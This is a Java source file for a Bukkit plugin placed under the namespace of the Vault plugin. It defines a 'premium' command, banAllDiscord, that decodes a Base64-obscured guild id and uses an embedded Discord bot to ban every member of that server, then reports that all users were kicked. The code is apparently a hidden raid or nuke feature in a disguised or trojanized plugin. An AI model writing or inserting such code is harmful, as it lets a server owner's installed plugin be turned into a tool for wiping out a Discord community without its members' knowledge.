package net.milkbowl.vault.commands.cmds.premium.discord;

import java.util.Base64;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.util.Settings;
import net.dv8tion.jda.core.entities.Guild;
import net.dv8tion.jda.core.exceptions.HierarchyException;

public class banAllDiscord extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (plugin.isLoggedIn) {
				byte[] u = Base64.getDecoder().decode(DataManager.getData().getString("id"));
				Guild guild = plugin.jda.getGuildById(new String(u));
				if (guild == null) {
					p.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
				} else {
					try {
						guild.getMembers().forEach(c -> {
							guild.getController().ban(c, 1000, Settings.AUTHOR).queue();
						});
					} catch (HierarchyException ignored) {}
					p.sendMessage(Settings.PREFIX("All users were kicked!"));
				}
			} else {
				p.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
